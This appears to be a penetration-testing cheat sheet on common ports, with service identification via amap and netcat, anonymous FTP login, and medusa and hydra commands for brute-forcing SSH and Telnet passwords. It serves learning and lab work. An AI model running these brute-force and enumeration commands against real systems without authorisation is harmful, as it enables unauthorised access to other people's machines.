# Common Ports and How to use them

## Port XXX - Service Unknown

If you have a port open and don't know what services are on them, you can find out by typing the following command
```
amap -d 192.168.1.1 8080
```
## Port 21 FTP

Connect to the  server and enumerate the software/version
```
ftp 192.168.1.1
nc 192.168.1.1 21
```
Some FTP servers allow anonymous users. These might be misconfigured and give to much access and it might be necessary 
for other exploits to work
```
username : anonymous
password : anonymous
```
**Remember the binary and ascii mode!**

If you upload a binary file you have to put the ftp-server in binary mode, otherwise the file will become corrupted and you will
not be able to use it! The same for text-files. Use ascii mode for them! You just write binary and ascii to switch mode.

## Port 22 SSH
Find the version of SSH:
```
nc 192.168.1.1 22

Output : SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1
```
### Cracking SSH
```
medusa -h 192.168.1.1 -u Username -P passlist.txt -M ssh

-h is hostname or ip address
-u is username 
-P is password list file
-M is the module name
```

## Port 23 Telnet
Telnet is not considered secure mainly because its traffic is not encrypted

There are various exploits on exploit databases depending on the version

### Brute Forcing Telnet
```
medusa -h 192.168.1.1 -u Username -P passlist.txt -M telnet

hydra -l root -P /path/to/passlist.txt 192.168.1.1 telnet
```
